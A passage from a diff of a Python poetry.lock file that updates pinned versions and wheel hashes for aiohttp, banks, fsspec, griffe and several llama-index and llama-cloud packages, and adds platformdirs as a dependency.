-    {file = "aiohttp-3.11.14-cp312-cp312-musllinux_1_2_s390x.whl", hash = "sha256:8d1dd75aa4d855c7debaf1ef830ff2dfcc33f893c7db0af2423ee761ebffd22b"},
-    {file = "aiohttp-3.11.14-cp312-cp312-musllinux_1_2_x86_64.whl", hash = "sha256:41cf0cefd9e7b5c646c2ef529c8335e7eafd326f444cc1cdb0c47b6bc836f9be"},
-    {file = "aiohttp-3.11.14-cp312-cp312-win32.whl", hash = "sha256:948abc8952aff63de7b2c83bfe3f211c727da3a33c3a5866a0e2cf1ee1aa950f"},
-    {file = "aiohttp-3.11.14-cp312-cp312-win_amd64.whl", hash = "sha256:3b420d076a46f41ea48e5fcccb996f517af0d406267e31e6716f480a3d50d65c"},
-    {file = "aiohttp-3.11.14-cp313-cp313-macosx_10_13_universal2.whl", hash = "sha256:8d14e274828561db91e4178f0057a915f3af1757b94c2ca283cb34cbb6e00b50"},
-    {file = "aiohttp-3.11.14-cp313-cp313-macosx_10_13_x86_64.whl", hash = "sha256:f30fc72daf85486cdcdfc3f5e0aea9255493ef499e31582b34abadbfaafb0965"},
-    {file = "aiohttp-3.11.14-cp313-cp313-macosx_11_0_arm64.whl", hash = "sha256:4edcbe34e6dba0136e4cabf7568f5a434d89cc9de5d5155371acda275353d228"},
-    {file = "aiohttp-3.11.14-cp313-cp313-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:1a7169ded15505f55a87f8f0812c94c9412623c744227b9e51083a72a48b68a5"},
-    {file = "aiohttp-3.11.14-cp313-cp313-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:ad1f2fb9fe9b585ea4b436d6e998e71b50d2b087b694ab277b30e060c434e5db"},
-    {file = "aiohttp-3.11.14-cp313-cp313-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:20412c7cc3720e47a47e63c0005f78c0c2370020f9f4770d7fc0075f397a9fb0"},
-    {file = "aiohttp-3.11.14-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:6dd9766da617855f7e85f27d2bf9a565ace04ba7c387323cd3e651ac4329db91"},
-    {file = "aiohttp-3.11.14-cp313-cp313-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:599b66582f7276ebefbaa38adf37585e636b6a7a73382eb412f7bc0fc55fb73d"},
-    {file = "aiohttp-3.11.14-cp313-cp313-musllinux_1_2_aarch64.whl", hash = "sha256:b41693b7388324b80f9acfabd479bd1c84f0bc7e8f17bab4ecd9675e9ff9c734"},
-    {file = "aiohttp-3.11.14-cp313-cp313-musllinux_1_2_armv7l.whl", hash = "sha256:86135c32d06927339c8c5e64f96e4eee8825d928374b9b71a3c42379d7437058"},
-    {file = "aiohttp-3.11.14-cp313-cp313-musllinux_1_2_i686.whl", hash = "sha256:04eb541ce1e03edc1e3be1917a0f45ac703e913c21a940111df73a2c2db11d73"},
-    {file = "aiohttp-3.11.14-cp313-cp313-musllinux_1_2_ppc64le.whl", hash = "sha256:dc311634f6f28661a76cbc1c28ecf3b3a70a8edd67b69288ab7ca91058eb5a33"},
-    {file = "aiohttp-3.11.14-cp313-cp313-musllinux_1_2_s390x.whl", hash = "sha256:69bb252bfdca385ccabfd55f4cd740d421dd8c8ad438ded9637d81c228d0da49"},
-    {file = "aiohttp-3.11.14-cp313-cp313-musllinux_1_2_x86_64.whl", hash = "sha256:2b86efe23684b58a88e530c4ab5b20145f102916bbb2d82942cafec7bd36a647"},
-    {file = "aiohttp-3.11.14-cp313-cp313-win32.whl", hash = "sha256:b9c60d1de973ca94af02053d9b5111c4fbf97158e139b14f1be68337be267be6"},
-    {file = "aiohttp-3.11.14-cp313-cp313-win_amd64.whl", hash = "sha256:0a29be28e60e5610d2437b5b2fed61d6f3dcde898b57fb048aa5079271e7f6f3"},
-    {file = "aiohttp-3.11.14-cp39-cp39-macosx_10_9_universal2.whl", hash = "sha256:14fc03508359334edc76d35b2821832f092c8f092e4b356e74e38419dfe7b6de"},
-    {file = "aiohttp-3.11.14-cp39-cp39-macosx_10_9_x86_64.whl", hash = "sha256:92007c89a8cb7be35befa2732b0b32bf3a394c1b22ef2dff0ef12537d98a7bda"},
-    {file = "aiohttp-3.11.14-cp39-cp39-macosx_11_0_arm64.whl", hash = "sha256:6d3986112e34eaa36e280dc8286b9dd4cc1a5bcf328a7f147453e188f6fe148f"},
-    {file = "aiohttp-3.11.14-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:749f1eb10e51dbbcdba9df2ef457ec060554842eea4d23874a3e26495f9e87b1"},
-    {file = "aiohttp-3.11.14-cp39-cp39-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:781c8bd423dcc4641298c8c5a2a125c8b1c31e11f828e8d35c1d3a722af4c15a"},
-    {file = "aiohttp-3.11.14-cp39-cp39-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:997b57e38aa7dc6caab843c5e042ab557bc83a2f91b7bd302e3c3aebbb9042a1"},
-    {file = "aiohttp-3.11.14-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:3a8b0321e40a833e381d127be993b7349d1564b756910b28b5f6588a159afef3"},
-    {file = "aiohttp-3.11.14-cp39-cp39-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:8778620396e554b758b59773ab29c03b55047841d8894c5e335f12bfc45ebd28"},
-    {file = "aiohttp-3.11.14-cp39-cp39-musllinux_1_2_aarch64.whl", hash = "sha256:e906da0f2bcbf9b26cc2b144929e88cb3bf943dd1942b4e5af066056875c7618"},
-    {file = "aiohttp-3.11.14-cp39-cp39-musllinux_1_2_armv7l.whl", hash = "sha256:87f0e003fb4dd5810c7fbf47a1239eaa34cd929ef160e0a54c570883125c4831"},
-    {file = "aiohttp-3.11.14-cp39-cp39-musllinux_1_2_i686.whl", hash = "sha256:7f2dadece8b85596ac3ab1ec04b00694bdd62abc31e5618f524648d18d9dd7fa"},
-    {file = "aiohttp-3.11.14-cp39-cp39-musllinux_1_2_ppc64le.whl", hash = "sha256:fe846f0a98aa9913c2852b630cd39b4098f296e0907dd05f6c7b30d911afa4c3"},
-    {file = "aiohttp-3.11.14-cp39-cp39-musllinux_1_2_s390x.whl", hash = "sha256:ced66c5c6ad5bcaf9be54560398654779ec1c3695f1a9cf0ae5e3606694a000a"},
-    {file = "aiohttp-3.11.14-cp39-cp39-musllinux_1_2_x86_64.whl", hash = "sha256:a40087b82f83bd671cbeb5f582c233d196e9653220404a798798bfc0ee189fff"},
-    {file = "aiohttp-3.11.14-cp39-cp39-win32.whl", hash = "sha256:95d7787f2bcbf7cb46823036a8d64ccfbc2ffc7d52016b4044d901abceeba3db"},
-    {file = "aiohttp-3.11.14-cp39-cp39-win_amd64.whl", hash = "sha256:22a8107896877212130c58f74e64b77f7007cb03cea8698be317272643602d45"},
-    {file = "aiohttp-3.11.14.tar.gz", hash = "sha256:d6edc538c7480fa0a3b2bdd705f8010062d74700198da55d16498e1b49549b9c"},
+    {file = "aiohttp-3.11.15-cp310-cp310-macosx_10_9_universal2.whl", hash = "sha256:078b1ce274f967951b42a65d5b7ec115b7886343a5271f2eed330458ea87bb48"},
+    {file = "aiohttp-3.11.15-cp310-cp310-macosx_10_9_x86_64.whl", hash = "sha256:48d790d05c76b6cb93a1259b44d3f0019b61d507f8ebf0d49da3ef5ac858b05d"},
+    {file = "aiohttp-3.11.15-cp310-cp310-macosx_11_0_arm64.whl", hash = "sha256:e13767424425bb607931a0b9e703b95d2693650011ef8f0166b4cd80066b66b9"},
+    {file = "aiohttp-3.11.15-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:7ac49c32901489343b4dab064ab520f6b879a03fb4f9667c84620b66f07bed69"},
+    {file = "aiohttp-3.11.15-cp310-cp310-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:576b56a34d26ea8a8f0e1a30b8a069ba4ab121fb8eb796d1b89fedda7c74c553"},
+    {file = "aiohttp-3.11.15-cp310-cp310-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:71ed71d9431e770550aab27a77ef9d30d33ce6f558ab7818be7205ae6aca635d"},
+    {file = "aiohttp-3.11.15-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:c982b2cbd7b8f4b31e9faf2de09e22b060a6cd0a693f20892dda41a8fb0f46ef"},
+    {file = "aiohttp-3.11.15-cp310-cp310-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:f00e7540a60460fbeaffff4a7dcf72fe8b710f8280a542a4d798273787c64e72"},
+    {file = "aiohttp-3.11.15-cp310-cp310-musllinux_1_2_aarch64.whl", hash = "sha256:9b97fae7f75a0b666ce4281627856d1b1a85477f26c2e8b266292e770c17df36"},
+    {file = "aiohttp-3.11.15-cp310-cp310-musllinux_1_2_armv7l.whl", hash = "sha256:a449c48f5b02c0c14f5310881558ca861bff8e00b1f79be4cf6a53f638464c30"},
+    {file = "aiohttp-3.11.15-cp310-cp310-musllinux_1_2_i686.whl", hash = "sha256:8c6e39f0bb2418f839841f92b3cd64077ff5166d724c984ab450ca08d5e51d92"},
+    {file = "aiohttp-3.11.15-cp310-cp310-musllinux_1_2_ppc64le.whl", hash = "sha256:e792131352418dde7b0c598e217e89ecf6a26889f46f35f910e5544ffdebf3ae"},
+    {file = "aiohttp-3.11.15-cp310-cp310-musllinux_1_2_s390x.whl", hash = "sha256:c28cbae1ce76dc48d0fcccb045ac21d00dcc1b306bb745910cf35585ce89404e"},
+    {file = "aiohttp-3.11.15-cp310-cp310-musllinux_1_2_x86_64.whl", hash = "sha256:d9c8417a24063f35b526f8bf14f6f4bdea6f3f49850457337b6ea928901adbbc"},
+    {file = "aiohttp-3.11.15-cp310-cp310-win32.whl", hash = "sha256:a50b86eb9cf74fa5b6f1386e08e1520dcbe83d7dfd4c8bf6f2ca72b03d42e79f"},
+    {file = "aiohttp-3.11.15-cp310-cp310-win_amd64.whl", hash = "sha256:a0361cafb50b185356a5f346c169aea1d14783df99e6da714d626b104586e0b5"},
+    {file = "aiohttp-3.11.15-cp311-cp311-macosx_10_9_universal2.whl", hash = "sha256:5bd37d615cd26d09321bd0168305f8508778712cf38aeffeed550274fb48a2ee"},
+    {file = "aiohttp-3.11.15-cp311-cp311-macosx_10_9_x86_64.whl", hash = "sha256:a3d706afcc808f6add4208dfa13f911fd93c2a3dab6be484fee4fd0602a0867e"},
+    {file = "aiohttp-3.11.15-cp311-cp311-macosx_11_0_arm64.whl", hash = "sha256:43625253e3dc018d34867b70909149f15f29eac0382802afe027f2fbf17bcb9c"},
+    {file = "aiohttp-3.11.15-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:437eee9e057a7907b11e4af2b18df56b6c795b28e0a3ac250691936cf6bf40eb"},
+    {file = "aiohttp-3.11.15-cp311-cp311-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:ec3dd04138bd30e6a3403dbd3ab5a5ccfb501597c5a95196cd816936ed55b777"},
+    {file = "aiohttp-3.11.15-cp311-cp311-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:85d73479b79172e7d667b466c170ca6097a334c09ecd83c95c210546031251b5"},
+    {file = "aiohttp-3.11.15-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:ae3a5d9f2fbe736fec7d24be25c57aa78c2d78d96540439ea68a8abbed9906fc"},
+    {file = "aiohttp-3.11.15-cp311-cp311-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:269d145c593a65f78fb9a64dece90341561ddb2e91a96d42681132b2f706c42a"},
+    {file = "aiohttp-3.11.15-cp311-cp311-musllinux_1_2_aarch64.whl", hash = "sha256:0987dcf32e4c47f22634d32e4b0ffbc368bbcf2b33b408cd1a3d2dc0a6a5cd34"},
+    {file = "aiohttp-3.11.15-cp311-cp311-musllinux_1_2_armv7l.whl", hash = "sha256:7cf4b2b5a0f7a738ecd759eaeaef800fc7c57683b7be9d8a43fcb86ca62701b4"},
+    {file = "aiohttp-3.11.15-cp311-cp311-musllinux_1_2_i686.whl", hash = "sha256:f1e0369f0dc8c895e718ce37147f56d46142d37596be183ab7a34192c5e6e4c5"},
+    {file = "aiohttp-3.11.15-cp311-cp311-musllinux_1_2_ppc64le.whl", hash = "sha256:82ddf7f642b9c0b08063f3cf4e2818b22901bce8ebad05c232d9e295e77436a0"},
+    {file = "aiohttp-3.11.15-cp311-cp311-musllinux_1_2_s390x.whl", hash = "sha256:0c7eba0f90e27ec4af64db051f35387fa17128e6eeb58ee0f2318f2627168cc2"},
+    {file = "aiohttp-3.11.15-cp311-cp311-musllinux_1_2_x86_64.whl", hash = "sha256:5a61df20fa77792e83307e266f76790f7cb67980dd476948948de212ee7ec64c"},
+    {file = "aiohttp-3.11.15-cp311-cp311-win32.whl", hash = "sha256:be11989cbc0728f81c0d022cef140ef8adb20d3012ad8f0ac61853bef571eb52"},
+    {file = "aiohttp-3.11.15-cp311-cp311-win_amd64.whl", hash = "sha256:357355c9d51c8b12bbc7de43b27ce4b51f14cce050e00b5a87d0d5527d779395"},
+    {file = "aiohttp-3.11.15-cp312-cp312-macosx_10_13_universal2.whl", hash = "sha256:433e7388b3063bba462b3362641988270b087a9ccae22390364f86b37a480c17"},
+    {file = "aiohttp-3.11.15-cp312-cp312-macosx_10_13_x86_64.whl", hash = "sha256:d99981304065f4ea407dd7495f74f8b8c10f0e26733f8a47dc174ece73744d14"},
+    {file = "aiohttp-3.11.15-cp312-cp312-macosx_11_0_arm64.whl", hash = "sha256:a3739daa52c0cff42f1c40f63b2fe818fcf41019d84c80a7add3224207a7060f"},
+    {file = "aiohttp-3.11.15-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:6fd82d0b3f73c59c80dade0ca8e0342de1ee261e147140ade65a465be670e83c"},
+    {file = "aiohttp-3.11.15-cp312-cp312-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:c930064b79cc0eb63678e376b819d546b0e2360264cd7544c32119496f646f35"},
+    {file = "aiohttp-3.11.15-cp312-cp312-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:291f324f49ecede693dfb4820a412d1388cb10a2214ab60028252b505e105d6f"},
+    {file = "aiohttp-3.11.15-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:65eb40e74e3126cba185da7a78815cf3a30140932193831b3bfd73c79965c723"},
+    {file = "aiohttp-3.11.15-cp312-cp312-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:a6d6d86443580f846ec9cf60f899b7cace34411f2ff5c95db5970047195e5bfa"},
+    {file = "aiohttp-3.11.15-cp312-cp312-musllinux_1_2_aarch64.whl", hash = "sha256:8b4d8d78fbd5290204dcf43957a2184acd5cee358f203f24a3a97f7d7984eeb7"},
+    {file = "aiohttp-3.11.15-cp312-cp312-musllinux_1_2_armv7l.whl", hash = "sha256:94c552a4864ed292dadf1d341213374284a3af72e49bea02e70ce6f07cb37004"},
+    {file = "aiohttp-3.11.15-cp312-cp312-musllinux_1_2_i686.whl", hash = "sha256:23857adc919b64bba8a4db0eccb24e53fcaf85633e690ef1581c5562ed58cae7"},
+    {file = "aiohttp-3.11.15-cp312-cp312-musllinux_1_2_ppc64le.whl", hash = "sha256:eba325409a0f990f9b43ed18916cbf5b9779bc4c979b8887c444e7be9c38ccca"},
+    {file = "aiohttp-3.11.15-cp312-cp312-musllinux_1_2_s390x.whl", hash = "sha256:f1b6c639750bf2a228957e25fcab7a7ff11987c543d70bf73223369f0d7bdb27"},
+    {file = "aiohttp-3.11.15-cp312-cp312-musllinux_1_2_x86_64.whl", hash = "sha256:2241d862dc6a3c0c2662a6934e79078d3a1e51a76c0dca5d65b30f3debee6c9b"},
+    {file = "aiohttp-3.11.15-cp312-cp312-win32.whl", hash = "sha256:18733fa6bbe44698ff96138c1f1d682bbdf0846250a42c25c108eed328fef0d4"},
+    {file = "aiohttp-3.11.15-cp312-cp312-win_amd64.whl", hash = "sha256:0ec98c22030ea2a430cb11afddda7d4737b7e5c236c704f0d7d15504978598f7"},
+    {file = "aiohttp-3.11.15-cp313-cp313-macosx_10_13_universal2.whl", hash = "sha256:c37aa3eb8eb92f3793f0c1e73f212a76cbc8d363e9990df54b5b7099f75ce740"},
+    {file = "aiohttp-3.11.15-cp313-cp313-macosx_10_13_x86_64.whl", hash = "sha256:5b5edd482ff0a8585b3f4e8b3681819447324166a43a5588800a5bca340dbf27"},
+    {file = "aiohttp-3.11.15-cp313-cp313-macosx_11_0_arm64.whl", hash = "sha256:45d8c22c91bdb7417bd4f5119242dbd2e2140c0e9de47342c765f127f897eb57"},
+    {file = "aiohttp-3.11.15-cp313-cp313-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:4b03093d4140d926965d23497a059ec59c8c07e602d2489ce5fb990f3a897db4"},
+    {file = "aiohttp-3.11.15-cp313-cp313-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:05eea49d598c4ece6f285e00464de206f838b48ff21938d5aa9c394e115945b9"},
+    {file = "aiohttp-3.11.15-cp313-cp313-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:63f8d6106566f98fcfde7a643c9da52d90679b8592dea76c4adfc3cd5d06d22c"},
+    {file = "aiohttp-3.11.15-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:36a490f1ebe0b982366314c77f02258f87bd5d9bd362839dc6a24188447f37eb"},
+    {file = "aiohttp-3.11.15-cp313-cp313-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:73a7f6283634dd30f93b9a67c414c00517869478b50361c503535e075fa07eaf"},
+    {file = "aiohttp-3.11.15-cp313-cp313-musllinux_1_2_aarch64.whl", hash = "sha256:0e97c1e55f6931f07ecaf53aef8352def8386adfd0cd3caa6429cc40e886d6a9"},
+    {file = "aiohttp-3.11.15-cp313-cp313-musllinux_1_2_armv7l.whl", hash = "sha256:d8370d31e6d8ecccd97cd791c466d0acb56527df51b0c105d7ea54c7fcc0f75b"},
+    {file = "aiohttp-3.11.15-cp313-cp313-musllinux_1_2_i686.whl", hash = "sha256:c2de66177e087999568638c02639cf0248011b5c7fca69b006947153c534fcab"},
+    {file = "aiohttp-3.11.15-cp313-cp313-musllinux_1_2_ppc64le.whl", hash = "sha256:edcddb97574402ff7481bc6f70819ba863e77b0be58a840ed5f59d52d2f20a71"},
+    {file = "aiohttp-3.11.15-cp313-cp313-musllinux_1_2_s390x.whl", hash = "sha256:29cce2a7e009494e675018c0b1819a133befbab8629c797276c5d793bbdf1138"},
+    {file = "aiohttp-3.11.15-cp313-cp313-musllinux_1_2_x86_64.whl", hash = "sha256:825ec92391e3e4ddda74de79ed0f8b443e9b412a0c9c82618ca2163abd875df5"},
+    {file = "aiohttp-3.11.15-cp313-cp313-win32.whl", hash = "sha256:430f9707f0c1239a92bff7769b0db185ef400278dc63c89f88ed1bd5153aab7a"},
+    {file = "aiohttp-3.11.15-cp313-cp313-win_amd64.whl", hash = "sha256:f30e6980ec5d6ad815a233e19e39fe27ea94b1081c31c8aa1df1b629da3737b8"},
+    {file = "aiohttp-3.11.15-cp39-cp39-macosx_10_9_universal2.whl", hash = "sha256:03ce9d2f01aef26cd6aaba2f330273c2364237db2f499b93c3e9f2e249f83cd2"},
+    {file = "aiohttp-3.11.15-cp39-cp39-macosx_10_9_x86_64.whl", hash = "sha256:1bee0f9e2d4088b57243d63afcb06256bd2d9ff683080f51e74fa790c8cfedfd"},
+    {file = "aiohttp-3.11.15-cp39-cp39-macosx_11_0_arm64.whl", hash = "sha256:7e20bd6aa51a5209c9131395e20ce126e8e317c0cf78a8180f026b4d73f018f6"},
+    {file = "aiohttp-3.11.15-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:23397670f3739b6f3c4019da8226190f6cce5ab2008b664ed96a6d1f0fe7f069"},
+    {file = "aiohttp-3.11.15-cp39-cp39-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:fc270fe480e7e425c45054543f58510fe649f70b77f514171909bbfe585105c0"},
+    {file = "aiohttp-3.11.15-cp39-cp39-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:84370ff70c1677ee0c4db40fe2baee6ffc72e9d32def3ff18739c1390c62329f"},
+    {file = "aiohttp-3.11.15-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:379882ab6a40e6e0879ad8e84dca74ddbadff94af4f314b59b7da89c8463a669"},
+    {file = "aiohttp-3.11.15-cp39-cp39-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:74afb637cd06760afe0aa55a3ce82178ef4c950be65935add8f3809f701f36ca"},
+    {file = "aiohttp-3.11.15-cp39-cp39-musllinux_1_2_aarch64.whl", hash = "sha256:558de86eef9a886e43c6ae5b75cecdce81203da5832d19d11da8de417967d478"},
+    {file = "aiohttp-3.11.15-cp39-cp39-musllinux_1_2_armv7l.whl", hash = "sha256:41f82df6f0f895f0f843bc86762bea45b4d0fe876de49239ffc89d2365426399"},
+    {file = "aiohttp-3.11.15-cp39-cp39-musllinux_1_2_i686.whl", hash = "sha256:38368a32530dcdeccfa47544cf66724118d9cc8a889c057e116723ab62994380"},
+    {file = "aiohttp-3.11.15-cp39-cp39-musllinux_1_2_ppc64le.whl", hash = "sha256:204f6695b47a7d130ddf6680158920825d0d32202a870e0bc56a2ec637935b1a"},
+    {file = "aiohttp-3.11.15-cp39-cp39-musllinux_1_2_s390x.whl", hash = "sha256:4b85486e8914d4e778343f5322834aada678eaf4c5315e50d41d9b74817ff97b"},
+    {file = "aiohttp-3.11.15-cp39-cp39-musllinux_1_2_x86_64.whl", hash = "sha256:79a08d675167c50f41d106d67bbcbc9e86e1b43d305c4b9f982d5c656a94a9ba"},
+    {file = "aiohttp-3.11.15-cp39-cp39-win32.whl", hash = "sha256:20dda85988a4f506bf5a457b416b238e32ab944a2deb878ddf0af92df9254a9b"},
+    {file = "aiohttp-3.11.15-cp39-cp39-win_amd64.whl", hash = "sha256:3cfd9f4aeaec4a75a0b4986a9977ac0a09b3d87ae83415e4b461e86715c80897"},
+    {file = "aiohttp-3.11.15.tar.gz", hash = "sha256:b9b9a1e592ac8fcc4584baea240e41f77415e0de98932fdf19565aa3b6a02d0b"},
 ]
 
 [package.dependencies]
@@ -270,13 +270,13 @@ extras = ["regex"]
 
 [[package]]
 name = "banks"
-version = "2.0.0"
+version = "2.1.1"
 description = "A prompt programming language"
 optional = false
 python-versions = ">=3.9"
 files = [
-    {file = "banks-2.0.0-py3-none-any.whl", hash = "sha256:26eeca39f2d5e41ac29661cfcfbff9a3f4adf79e0ddfb05ca29e79aa15d337af"},
-    {file = "banks-2.0.0.tar.gz", hash = "sha256:036b7990f690a8282905fdc6970627efd3e7f1d05f09d6d39a565ef4e9b1971a"},
+    {file = "banks-2.1.1-py3-none-any.whl", hash = "sha256:06e4ee46a0ff2fcdf5f64a5f028a7b7ceb719d5c7b9339f5aa90b24936fbb7f5"},
+    {file = "banks-2.1.1.tar.gz", hash = "sha256:95ec9c8f3c173c9f1c21eb2451ba0e21dda87f1ceb738854fabadb54bc387b86"},
 ]
 
 [package.dependencies]
@@ -284,6 +284,7 @@ deprecated = "*"
 eval-type-backport = {version = "*", markers = "python_version < \"3.10\""}
 griffe = "*"
 jinja2 = "*"
+platformdirs = "*"
 pydantic = "*"
 
 [package.extras]
@@ -1013,13 +1014,13 @@ files = [
 
 [[package]]
 name = "fsspec"
-version = "2025.3.0"
+version = "2025.3.2"
 description = "File-system specification"
 optional = false
-python-versions = ">=3.8"
+python-versions = ">=3.9"
 files = [
-    {file = "fsspec-2025.3.0-py3-none-any.whl", hash = "sha256:efb87af3efa9103f94ca91a7f8cb7a4df91af9f74fc106c9c7ea0efd7277c1b3"},
-    {file = "fsspec-2025.3.0.tar.gz", hash = "sha256:a935fd1ea872591f2b5148907d103488fc523295e6c64b835cfad8c3eca44972"},
+    {file = "fsspec-2025.3.2-py3-none-any.whl", hash = "sha256:2daf8dc3d1dfa65b6aa37748d112773a7a08416f6c70d96b264c96476ecaf711"},
+    {file = "fsspec-2025.3.2.tar.gz", hash = "sha256:e52c77ef398680bbd6a98c0e628fbc469491282981209907bbc8aea76a04fdc6"},
 ]
 
 [package.extras]
@@ -1155,13 +1156,13 @@ test = ["objgraph", "psutil"]
 
 [[package]]
 name = "griffe"
-version = "1.7.0"
+version = "1.7.2"
 description = "Signatures for entire Python programs. Extract the structure, the frame, the skeleton of your project, to generate API documentation or find breaking changes in your API."
 optional = false
 python-versions = ">=3.9"
 files = [
-    {file = "griffe-1.7.0-py3-none-any.whl", hash = "sha256:6b44efc53a3f290d42c4da521f42235177b3bd107877dd55955318a37930c572"},
-    {file = "griffe-1.7.0.tar.gz", hash = "sha256:72e9c1593c7af92a387906293fc4a318c2e8e8aef501c64678c809794b4bdca4"},
+    {file = "griffe-1.7.2-py3-none-any.whl", hash = "sha256:1ed9c2e338a75741fc82083fe5a1bc89cb6142efe126194cc313e34ee6af5423"},
+    {file = "griffe-1.7.2.tar.gz", hash = "sha256:98d396d803fab3b680c2608f300872fd57019ed82f0672f5b5323a9ad18c540c"},
 ]
 
 [package.dependencies]
@@ -1667,13 +1668,13 @@ files = [
 
 [[package]]
 name = "llama-cloud"
-version = "0.1.16"
+version = "0.1.17"
 description = ""
 optional = false
 python-versions = "<4,>=3.8"
 files = [
-    {file = "llama_cloud-0.1.16-py3-none-any.whl", hash = "sha256:a484cf762d2741282f96033c0c09f6c8ad1b93b4efb7520088647fd845d341d4"},
-    {file = "llama_cloud-0.1.16.tar.gz", hash = "sha256:fc68b24471907958d4862a3db1e973513de76d42f58c29d935b92c06cb1f4e3e"},
+    {file = "llama_cloud-0.1.17-py3-none-any.whl", hash = "sha256:4c13267c23d336227176d33ef9cd091f77aded4e1c9c6e7031a3b0ecfe7d5c8d"},
+    {file = "llama_cloud-0.1.17.tar.gz", hash = "sha256:f351fa0f1f5b6b9bce650eda78fc84511ba72c09bdafd4525fde6b7a4aac20f3"},
 ]
 
 [package.dependencies]
@@ -1683,20 +1684,21 @@ pydantic = ">=1.10"
 
 [[package]]
 name = "llama-cloud-services"
-version = "0.6.8"
+version = "0.6.9"
 description = "Tailored SDK clients for LlamaCloud services."
 optional = false
 python-versions = "<4.0,>=3.9"
 files = [
-    {file = "llama_cloud_services-0.6.8-py3-none-any.whl", hash = "sha256:d59f6b294bf59d840486dbba9c1ff9424b646f572b3b4b131d7a2793cb64dc08"},
-    {file = "llama_cloud_services-0.6.8.tar.gz", hash = "sha256:572c2b955bbf8ba2bbd5ec80d5fbdb92185fd9a4f8134b82a87ac43165d47732"},
+    {file = "llama_cloud_services-0.6.9-py3-none-any.whl", hash = "sha256:fd3705b471a72bb31f3f20e4d4131b81f7e0ddae0c044197660a4741347ef2c4"},
+    {file = "llama_cloud_services-0.6.9.tar.gz", hash = "sha256:aa3ba309f64723abd30b8fbb2dd99349d616cc79e09e37c52e10a69e84fe8d48"},
 ]
 
 [package.dependencies]
 click = ">=8.1.7,<9.0.0"
 eval-type-backport = {version = ">=0.2.0,<0.3.0", markers = "python_version < \"3.10\""}
-llama-cloud = ">=0.1.16,<0.2.0"
+llama-cloud = ">=0.1.17,<0.2.0"
 llama-index-core = ">=0.11.0"
+platformdirs = ">=4.3.7,<5.0.0"
 pydantic = "!=2.10"
 python-dotenv = ">=1.0.1,<2.0.0"
 
@@ -1734,13 +1736,13 @@ llama-index-llms-openai = ">=0.3.0,<0.4.0"
 
 [[package]]
 name = "llama-index-core"
-version = "0.12.27"
+version = "0.12.28"
 description = "Interface between LLMs and your data"
 optional = false
 python-versions = "<4.0,>=3.9"
 files = [
-    {file = "llama_index_core-0.12.27-py3-none-any.whl", hash = "sha256:01f3f6f539092579cfaccff86c47b7e78c34638273d51417f40d173bf007a84d"},
-    {file = "llama_index_core-0.12.27.tar.gz", hash = "sha256:5019f6e5e5dc2f05da5b802fb02bece213ae4f66ef328b7dd537ddbbbed71374"},
+    {file = "llama_index_core-0.12.28-py3-none-any.whl", hash = "sha256:9bd24224bd57dd5e97bb0a2550f31f6c08b7dc396305f35bbe9714d17b1409a6"},
+    {file = "llama_index_core-0.12.28.tar.gz", hash = "sha256:bf4a9697525e1294855d2df5c3a56b9720c185cde0eae2da713e7629c456c643"},
 ]
 
 [package.dependencies]
@@ -1786,13 +1788,13 @@ openai = ">=1.1.0"
 
 [[package]]
 name = "llama-index-indices-managed-llama-cloud"
-version = "0.6.9"
+version = "0.6.10"
 description = "llama-index indices llama-cloud integration"
 optional = false
 python-versions = "<4.0,>=3.9"
 files = [
-    {file = "llama_index_indices_managed_llama_cloud-0.6.9-py3-none-any.whl", hash = "sha256:8f4002d6d508b8afe7edd003d41e7236868b2774ec0ca266e84d002616e5b96c"},
-    {file = "llama_index_indices_managed_llama_cloud-0.6.9.tar.gz", hash = "sha256:c6450ef8aa99643cf8e78e1371b861a4f209a3bb80b3ec67fd937741f9da8e74"},
